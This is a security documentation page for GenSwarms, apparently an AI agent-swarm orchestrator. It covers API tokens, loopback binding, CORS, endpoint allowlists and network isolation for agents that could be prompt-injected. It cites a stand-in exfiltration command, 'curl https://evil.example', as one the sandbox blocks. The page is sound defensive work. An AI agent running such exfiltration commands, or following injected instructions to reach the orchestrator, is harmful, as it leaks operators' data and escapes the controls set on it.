---
description: Securing a GenSwarms deployment — API authentication, network binding, CORS, agent network isolation, endpoint allowlisting, and the config-path restriction.
---

# Security

This page covers the operational controls you use to run GenSwarms safely. They
are all **off-by-default-safe**: a fresh server is never silently open to the
network, but you must opt in to the controls below before exposing it.

## API authentication

The REST API and the `swarm:{name}` WebSocket are gated by a fail-closed policy:

| `GENSWARMS_API_TOKEN` | Who may call the API |
|-----------------------|----------------------|
| **set** | every request must present `Authorization: Bearer <token>` (constant-time compared); WebSocket accepts it via `?token=` or the header. Missing/wrong → `401`. |
| **unset** | only loopback callers (`127.0.0.0/8`, `::1`) are allowed; remote callers are refused. |

So a server is never network-open without a token. **Set `GENSWARMS_API_TOKEN`
before binding to any non-local interface.** The CLI reads the same variable and
attaches the Bearer header automatically, so a token-protected server stays
transparent to `genswarms` commands.

!!! warning "Local agents share loopback"
    The token-less default protects against *remote* callers, but a `:bwrap`/
    `:local` agent runs on the same host and **is** a loopback caller. To stop a
    (potentially prompt-injected) local agent from reaching the orchestrator API,
    set `GENSWARMS_API_TOKEN` (it is not exposed to agents) and/or run agents
    with [network isolation](#agent-network-isolation).

## Network binding

| Variable | Default | Effect |
|----------|---------|--------|
| `GENSWARMS_HTTP_IP` | `127.0.0.1` (loopback) | the address the production HTTP endpoint binds to |

The production server binds to **loopback by default**. To expose it (e.g. a
container behind a proxy) set `GENSWARMS_HTTP_IP=0.0.0.0` (or `::`, or a specific
address) — and set an API token first.

## CORS

| Variable | Default | Effect |
|----------|---------|--------|
| `GENSWARMS_CORS_ORIGINS` | local dev origins (`localhost`/`127.0.0.1`/`[::1]`) | which browser origins may call the API |

Unset → local dev origins only. `*` → any origin (only sensible behind a token).
Otherwise a comma-separated exact-match allowlist.

## Agent network isolation

Set `network: :isolated` in an agent's `config` when the agent ingests
**untrusted/external content** (web pages, third-party files, messages from
outside users) — anything that can prompt-inject it:

```elixir
%{name: :researcher, backend: :bwrap,            config: %{network: :isolated}}
%{name: :scraper,    backend: {:docker, "web"}, config: %{network: :isolated}}
```

An isolated agent gets **no network**; its only egress is a forwarder pinned to
the LLM endpoint. Inside the sandbox, `curl http://localhost:4000` (the
orchestrator) and `curl https://evil.example` (exfiltration) both fail — only the
LLM is reachable, and the destination is fixed by the host, not the agent. This
prevents an injected agent from escalating into the swarm or exfiltrating data.

Requires `socat` on the host. The default (`network: :open`) is unchanged. See
[Backends](backends.md) for the per-backend mechanism.

### Endpoint allowlist

A per-agent `:endpoint` is honored as the isolated forwarder's destination only
if its host is allowlisted:

| Variable | Effect |
|----------|--------|
| `GENSWARMS_ALLOWED_ENDPOINTS` | comma-separated hosts a per-agent endpoint may point at (in addition to the server's own endpoint host) |

The operator's env/default endpoint is always trusted. An isolated agent whose
endpoint is not allowed **fails to start** rather than forwarding to an arbitrary
host.

## API config-path restriction

`POST /api/swarms {"config_path": "..."}` loads a server-side file. The path is
restricted to a directory:

| Variable | Default | Effect |
|----------|---------|--------|
| `GENSWARMS_SWARM_CONFIG_DIR` | the server's working directory | directory that request-supplied `config_path` values must stay within |

Paths that escape (absolute or `..` traversal) are rejected with `400`. The CLI
is operator-run and unrestricted.

## Behavior changes to be aware of

If you are upgrading, note these defaults:

- **HTTP binds to loopback** in production by default (was all-interfaces). Set
  `GENSWARMS_HTTP_IP` for wider exposure.
- **SSH host-key verification is on** by default — an unknown/changed remote host
  key aborts the connection (MITM protection). Populate `known_hosts`, or opt out
  per-backend with `silently_accept_hosts: true`.
- **Swarm definitions and dynamic mutations are validated by the
  [IR gate](intermediate-representation.md#the-default-control-plane-gate)** — an
  invalid config is refused at start, and `add_agent`/`scale` are bounded by the
  per-swarm agent cap.

## Environment variables

| Variable | Purpose |
|----------|---------|
| `GENSWARMS_API_TOKEN` | API Bearer token (unset → loopback-only) |
| `GENSWARMS_HTTP_IP` | production bind address (default loopback) |
| `GENSWARMS_CORS_ORIGINS` | CORS origin allowlist |
| `GENSWARMS_ALLOWED_ENDPOINTS` | per-agent endpoint host allowlist (isolation) |
| `GENSWARMS_SWARM_CONFIG_DIR` | allowed directory for API `config_path` |
